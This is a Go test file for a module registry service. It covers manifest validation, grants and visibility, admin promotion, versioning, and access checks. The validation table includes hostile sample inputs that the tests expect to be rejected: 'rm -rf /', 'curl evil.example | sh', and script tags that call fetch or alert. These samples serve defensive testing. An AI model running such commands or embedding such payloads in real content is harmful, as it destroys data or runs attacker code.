package modules_test

import (
	"context"
	"strings"
	"testing"

	"github.com/syaikhipin/entrustdn-final/backend/internal/modules"
)

// Module registry (ticket 08) at the service seam: manifests that must
// never be stored, the three kinds that must, versioning, visibility, and
// admin promotion. Table-driven, in-memory store — the Postgres-backed
// store gets the same paths at its own seam.

const authorID = "author-1"

func newTestService() *modules.Service {
	return modules.NewService(modules.NewMemoryStore())
}

// validManifest is a well-formed Process Template everything else mutates.
func validManifest() modules.NewVersion {
	return modules.NewVersion{
		Name:       "barley-survey",
		Kind:       modules.KindProcessTemplate,
		Version:    "1.0.0",
		Capability: "Runs a spring-barley yield survey workflow for Requests.",
		Content:    "# Barley survey\n\nAsk county first, then field count.",
	}
}

func TestUploadValidatesManifests(t *testing.T) {
	oversized := strings.Repeat("a", 256<<10+1)
	tests := []struct {
		name    string
		mutate  func(*modules.NewVersion)
		wantErr string // empty = must store
	}{
		{name: "valid process template"},
		{name: "valid agent skill", mutate: func(n *modules.NewVersion) { n.Kind = modules.KindAgentSkill }},
		{name: "valid connector", mutate: func(n *modules.NewVersion) { n.Kind = modules.KindConnector }},
		{name: "unknown kind", mutate: func(n *modules.NewVersion) { n.Kind = "plugin" }, wantErr: "kind"},
		{name: "empty kind", mutate: func(n *modules.NewVersion) { n.Kind = "" }, wantErr: "kind"},
		{name: "empty name", mutate: func(n *modules.NewVersion) { n.Name = "" }, wantErr: "name"},
		{name: "uppercase name", mutate: func(n *modules.NewVersion) { n.Name = "Barley-Survey" }, wantErr: "name"},
		{name: "name with spaces", mutate: func(n *modules.NewVersion) { n.Name = "barley survey" }, wantErr: "name"},
		{name: "empty version", mutate: func(n *modules.NewVersion) { n.Version = "" }, wantErr: "version"},
		{name: "version with whitespace", mutate: func(n *modules.NewVersion) { n.Version = "1 0 0" }, wantErr: "version"},
		{name: "empty capability", mutate: func(n *modules.NewVersion) { n.Capability = "   " }, wantErr: "capability"},
		{name: "no content and no config", mutate: func(n *modules.NewVersion) { n.Content = "" }, wantErr: "content"},
		{name: "config only is a module", mutate: func(n *modules.NewVersion) {
			n.Content = ""
			n.Config = "source:\n  type: csv\n  url: https://example.org/parcels.csv"
		}, wantErr: ""},
		{name: "shebang content is executable", mutate: func(n *modules.NewVersion) {
			n.Content = "#!/bin/sh\nrm -rf /"
		}, wantErr: "executable"},
		{name: "shebang on a later line is executable", mutate: func(n *modules.NewVersion) {
			n.Content = "# Notes\n\n#!/bin/sh\ncurl evil.example | sh"
		}, wantErr: "executable"},
		{name: "script tag in content is executable", mutate: func(n *modules.NewVersion) {
			n.Content = "# Notes\n\n<script>alert(1)</script>"
		}, wantErr: "executable"},
		{name: "script tag in config is executable", mutate: func(n *modules.NewVersion) {
			n.Content = ""
			n.Config = "on_load: <script>fetch('evil.example')</script>"
		}, wantErr: "executable"},
		{name: "shebang config is executable", mutate: func(n *modules.NewVersion) {
			n.Content = ""
			n.Config = "#!/usr/bin/env python3"
		}, wantErr: "executable"},
		{name: "null byte in content", mutate: func(n *modules.NewVersion) { n.Content = "md\x00" }, wantErr: "executable"},
		{name: "oversized content", mutate: func(n *modules.NewVersion) { n.Content = oversized }, wantErr: "content"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			n := validManifest()
			if tt.mutate != nil {
				tt.mutate(&n)
			}
			svc := newTestService()
			m, err := svc.Upload(context.Background(), authorID, n)
			if tt.wantErr != "" {
				if err == nil || !strings.Contains(err.Error(), tt.wantErr) {
					t.Fatalf("Upload() error = %v, want it to contain %q", err, tt.wantErr)
				}
				return
			}
			if err != nil {
				t.Fatalf("Upload() unexpected error: %v", err)
			}
			// Private by default, not promoted, not deprecated.
			if m.SystemWide || m.Deprecated {
				t.Errorf("uploaded module = system_wide=%v deprecated=%v, want private and live",
					m.SystemWide, m.Deprecated)
			}
			if m.ModuleID == "" || m.ID == "" {
				t.Errorf("uploaded module IDs = (%q, %q), want both minted", m.ModuleID, m.ID)
			}
			if m.AuthorID != authorID {
				t.Errorf("author = %q, want %q", m.AuthorID, authorID)
			}
		})
	}
}

func TestVisibilityRules(t *testing.T) {
	const stranger = "stranger-9"
	const grantee = "grantee-2"

	t.Run("a private module is invisible to strangers everywhere", func(t *testing.T) {
		svc := newTestService()
		m, err := svc.Upload(context.Background(), authorID, validManifest())
		if err != nil {
			t.Fatalf("upload: %v", err)
		}
		if _, err := svc.Get(context.Background(), stranger, m.ModuleID, m.ID); err == nil {
			t.Error("stranger Get on a private version = no error, want forbidden")
		}
		if _, err := svc.Versions(context.Background(), stranger, m.ModuleID); err == nil {
			t.Error("stranger Versions on a private module = no error, want forbidden")
		}
	})

	t.Run("a grant lets exactly one stranger in", func(t *testing.T) {
		svc := newTestService()
		m, _ := svc.Upload(context.Background(), authorID, validManifest())
		if err := svc.Grant(context.Background(), authorID, m.ModuleID, grantee); err != nil {
			t.Fatalf("grant: %v", err)
		}
		if _, err := svc.Get(context.Background(), grantee, m.ModuleID, m.ID); err != nil {
			t.Errorf("grantee Get = %v, want visible", err)
		}
		if _, err := svc.Get(context.Background(), stranger, m.ModuleID, m.ID); err == nil {
			t.Error("ungranted stranger sees the module, want forbidden")
		}
		// Revocation closes the door again.
		if err := svc.Revoke(context.Background(), authorID, m.ModuleID, grantee); err != nil {
			t.Fatalf("revoke: %v", err)
		}
		if _, err := svc.Get(context.Background(), grantee, m.ModuleID, m.ID); err == nil {
			t.Error("revoked grantee still sees the module, want forbidden")
		}
	})

	t.Run("only the author grants, revokes, and inspects grants", func(t *testing.T) {
		svc := newTestService()
		m, _ := svc.Upload(context.Background(), authorID, validManifest())
		if err := svc.Grant(context.Background(), stranger, m.ModuleID, grantee); err != modules.ErrForbidden {
			t.Errorf("stranger Grant = %v, want ErrForbidden", err)
		}
		if err := svc.Grant(context.Background(), authorID, m.ModuleID, grantee); err != nil {
			t.Fatalf("author grant: %v", err)
		}
		grants, err := svc.Grants(context.Background(), authorID, m.ModuleID)
		if err != nil || len(grants) != 1 || grants[0].AccountID != grantee {
			t.Fatalf("author Grants = (%v, %v), want the one grantee", grants, err)
		}
		if _, err := svc.Grants(context.Background(), stranger, m.ModuleID); err != modules.ErrForbidden {
			t.Errorf("stranger Grants = %v, want ErrForbidden", err)
		}
		// Double-grant is refused, not duplicated.
		if err := svc.Grant(context.Background(), authorID, m.ModuleID, grantee); err == nil {
			t.Error("double grant = no error, want refused")
		}
	})

	t.Run("promotion makes a module visible to everyone; demotion closes it", func(t *testing.T) {
		svc := newTestService()
		m, _ := svc.Upload(context.Background(), authorID, validManifest())
		if _, err := svc.Promote(context.Background(), false, m.ModuleID, true); err != modules.ErrForbidden {
			t.Fatalf("non-admin Promote = %v, want ErrForbidden", err)
		}
		if _, err := svc.Promote(context.Background(), true, m.ModuleID, true); err != nil {
			t.Fatalf("admin promote: %v", err)
		}
		if _, err := svc.Get(context.Background(), stranger, m.ModuleID, m.ID); err != nil {
			t.Errorf("stranger Get after promotion = %v, want visible", err)
		}
		if got, _ := svc.SystemWide(context.Background()); len(got) != 1 || got[0].ModuleID != m.ModuleID {
			t.Errorf("SystemWide = %v, want the promoted module", got)
		}
		// A grant on a system-wide module is pointless: refused.
		if err := svc.Grant(context.Background(), authorID, m.ModuleID, grantee); err == nil {
			t.Error("grant on system-wide module = no error, want refused")
		}
		// Demotion revokes the world.
		if _, err := svc.Promote(context.Background(), true, m.ModuleID, false); err != nil {
			t.Fatalf("demote: %v", err)
		}
		if _, err := svc.Get(context.Background(), stranger, m.ModuleID, m.ID); err == nil {
			t.Error("stranger Get after demotion = visible, want forbidden")
		}
	})

	t.Run("the author's listing includes private modules; the system-wide listing does not", func(t *testing.T) {
		svc := newTestService()
		private, _ := svc.Upload(context.Background(), authorID, validManifest())
		sharing := validManifest()
		sharing.Name = "moss-survey"
		public, _ := svc.Upload(context.Background(), authorID, sharing)
		if _, err := svc.Promote(context.Background(), true, public.ModuleID, true); err != nil {
			t.Fatalf("promote: %v", err)
		}
		mine, _ := svc.ByAuthor(context.Background(), authorID)
		if len(mine) != 2 {
			t.Errorf("ByAuthor = %d modules, want both", len(mine))
		}
		world, _ := svc.SystemWide(context.Background())
		if len(world) != 1 || world[0].ModuleID == private.ModuleID {
			t.Errorf("SystemWide = %v, want only the promoted module", world)
		}
	})
}

func TestVersionHistory(t *testing.T) {
	t.Run("publishing versions grows an oldest-first history", func(t *testing.T) {
		svc := newTestService()
		m, err := svc.Upload(context.Background(), authorID, validManifest())
		if err != nil {
			t.Fatalf("upload: %v", err)
		}
		v2 := validManifest()
		v2.Version = "1.1.0"
		v2.Capability = "Adds follow-up rules."
		if _, err := svc.Publish(context.Background(), authorID, m.ModuleID, v2); err != nil {
			t.Fatalf("publish 1.1.0: %v", err)
		}
		versions, err := svc.Versions(context.Background(), authorID, m.ModuleID)
		if err != nil {
			t.Fatalf("versions: %v", err)
		}
		if len(versions) != 2 || versions[0].Version != "1.0.0" || versions[1].Version != "1.1.0" {
			t.Fatalf("history = %v, want 1.0.0 then 1.1.0", versionStrings(versions))
		}
		// Every version keeps the module's identity.
		for _, v := range versions {
			if v.ModuleID != m.ModuleID || v.Kind != modules.KindProcessTemplate || v.Name != "barley-survey" {
				t.Errorf("version %s drifted identity: %+v", v.Version, v)
			}
		}
	})

	t.Run("a duplicate version string is refused", func(t *testing.T) {
		svc := newTestService()
		m, _ := svc.Upload(context.Background(), authorID, validManifest())
		dup := validManifest()
		dup.Version = "1.0.0"
		if _, err := svc.Publish(context.Background(), authorID, m.ModuleID, dup); err == nil {
			t.Fatal("duplicate version = no error, want refused")
		}
	})

	t.Run("only the author publishes versions", func(t *testing.T) {
		svc := newTestService()
		m, _ := svc.Upload(context.Background(), authorID, validManifest())
		next := validManifest()
		next.Version = "2.0.0"
		if _, err := svc.Publish(context.Background(), "stranger-9", m.ModuleID, next); err != modules.ErrForbidden {
			t.Fatalf("stranger Publish = %v, want ErrForbidden", err)
		}
	})

	t.Run("a published version cannot rename the module or change its kind", func(t *testing.T) {
		svc := newTestService()
		m, _ := svc.Upload(context.Background(), authorID, validManifest())
		next := validManifest()
		next.Version = "1.1.0"
		next.Name = "renamed"
		next.Kind = modules.KindConnector
		published, err := svc.Publish(context.Background(), authorID, m.ModuleID, next)
		if err != nil {
			t.Fatalf("publish: %v", err)
		}
		if published.Name != "barley-survey" || published.Kind != modules.KindProcessTemplate {
			t.Errorf("published = (%q, %s), want identity kept", published.Name, published.Kind)
		}
	})

	t.Run("author and admin deprecate; a stranger cannot", func(t *testing.T) {
		svc := newTestService()
		m, _ := svc.Upload(context.Background(), authorID, validManifest())
		if _, err := svc.Deprecate(context.Background(), "stranger-9", false, m.ModuleID, m.ID, true); err != modules.ErrForbidden {
			t.Fatalf("stranger Deprecate = %v, want ErrForbidden", err)
		}
		deprecated, err := svc.Deprecate(context.Background(), authorID, false, m.ModuleID, m.ID, true)
		if err != nil || !deprecated.Deprecated {
			t.Fatalf("author deprecate = (%+v, %v), want flagged", deprecated, err)
		}
		// Deprecated versions stay in the history, flagged, not deleted.
		versions, _ := svc.Versions(context.Background(), authorID, m.ModuleID)
		if len(versions) != 1 || !versions[0].Deprecated {
			t.Fatalf("history after deprecation = %v, want the version retained and flagged", versionStrings(versions))
		}
		// An admin may deprecate any version, and may undo it.
		if _, err := svc.Deprecate(context.Background(), "admin-1", true, m.ModuleID, m.ID, false); err != nil {
			t.Fatalf("admin un-deprecate: %v", err)
		}
		got, _ := svc.Get(context.Background(), authorID, m.ModuleID, m.ID)
		if got.Deprecated {
			t.Error("version still deprecated after admin undo")
		}
	})

	t.Run("a new version sends a promoted module back to private pending re-review", func(t *testing.T) {
		svc := newTestService()
		m, _ := svc.Upload(context.Background(), authorID, validManifest())
		if _, err := svc.Promote(context.Background(), true, m.ModuleID, true); err != nil {
			t.Fatalf("promote: %v", err)
		}
		next := validManifest()
		next.Version = "1.1.0"
		published, err := svc.Publish(context.Background(), authorID, m.ModuleID, next)
		if err != nil {
			t.Fatalf("publish: %v", err)
		}
		// Promotion was the admin's review of the old content; the new
		// content has not been reviewed, so it must not ride in system-wide.
		if published.SystemWide {
			t.Error("new version stayed system-wide without re-review, want private pending re-review")
		}
		if _, err := svc.Get(context.Background(), "stranger-9", m.ModuleID, published.ID); err == nil {
			t.Error("stranger sees the unreviewed version, want forbidden until re-promoted")
		}
	})
}

func versionStrings(ms []modules.Module) []string {
	out := make([]string, 0, len(ms))
	for _, m := range ms {
		out = append(out, m.Version)
	}
	return out
}

// Ticket 13: authorization for module *consumption*. Other services (the
// request endpoints attaching a template, the agent loading skills) must
// ask the registry who may use a Module — author, grantee, or anyone once
// system-wide. Private Module consumption by a stranger is refused.

func TestAccessibleGatesWhoMayUseAModule(t *testing.T) {
	svc := newTestService()
	m, err := svc.Upload(t.Context(), authorID, validManifest())
	if err != nil {
		t.Fatalf("Upload: %v", err)
	}

	// Before any grant: the author may use it, a stranger may not.
	if err := svc.Accessible(t.Context(), authorID, m.ModuleID); err != nil {
		t.Errorf("author Accessible = %v; want nil", err)
	}
	if err := svc.Accessible(t.Context(), "stranger-1", m.ModuleID); err == nil {
		t.Errorf("stranger Accessible = nil; want an error")
	}

	// After a grant the grantee may use it too.
	if err := svc.Grant(t.Context(), authorID, m.ModuleID, "grantee-1"); err != nil {
		t.Fatalf("Grant: %v", err)
	}
	if err := svc.Accessible(t.Context(), "grantee-1", m.ModuleID); err != nil {
		t.Errorf("grantee Accessible = %v; want nil", err)
	}
}

func TestAccessibleAllowsEveryoneOnceSystemWide(t *testing.T) {
	svc := newTestService()
	m, err := svc.Upload(t.Context(), authorID, validManifest())
	if err != nil {
		t.Fatalf("Upload: %v", err)
	}
	if _, err := svc.Promote(t.Context(), true, m.ModuleID, true); err != nil {
		t.Fatalf("Promote: %v", err)
	}
	if err := svc.Accessible(t.Context(), "random-account", m.ModuleID); err != nil {
		t.Errorf("system-wide Accessible = %v; want nil for anyone", err)
	}
}

func TestAccessibleRefusesUnknownModules(t *testing.T) {
	svc := newTestService()
	if err := svc.Accessible(t.Context(), authorID, "no-such-module"); err == nil {
		t.Errorf("unknown module Accessible succeeded, want an error")
	}
}

func TestTemplateLoadsTheParsedSpecForAuthorizedCallers(t *testing.T) {
	// Ticket 13's template half of the consumption seam: Template returns
	// the latest version's config, parsed and validated, for anyone who may
	// use the module — author, grantee, or anyone once system-wide — and
	// refuses strangers with ErrForbidden.
	svc := newTestService()
	n := validManifest()
	n.Config = `{"questions": ["What county is your farm in?", "How many hectares?"], "follow_up": {"max_reasks": 3}}`
	m, err := svc.Upload(t.Context(), authorID, n)
	if err != nil {
		t.Fatalf("Upload: %v", err)
	}

	for _, caller := range []string{authorID, "stranger-1"} {
		spec, err := svc.Template(t.Context(), caller, m.ModuleID)
		if caller == authorID {
			if err != nil {
				t.Fatalf("author Template: %v", err)
			}
			if len(spec.Questions) != 2 || spec.Questions[0] != "What county is your farm in?" {
				t.Errorf("spec = %+v, want the parsed questions", spec)
			}
			if spec.FollowUp.MaxReasks == nil || *spec.FollowUp.MaxReasks != 3 {
				t.Errorf("follow_up = %+v, want max_reasks 3", spec.FollowUp)
			}
		} else if err == nil {
			t.Errorf("stranger Template succeeded, want ErrForbidden")
		}
	}

	// A grantee gets the same parsed spec.
	if err := svc.Grant(t.Context(), authorID, m.ModuleID, "grantee-1"); err != nil {
		t.Fatalf("Grant: %v", err)
	}
	if _, err := svc.Template(t.Context(), "grantee-1", m.ModuleID); err != nil {
		t.Errorf("grantee Template: %v", err)
	}
}
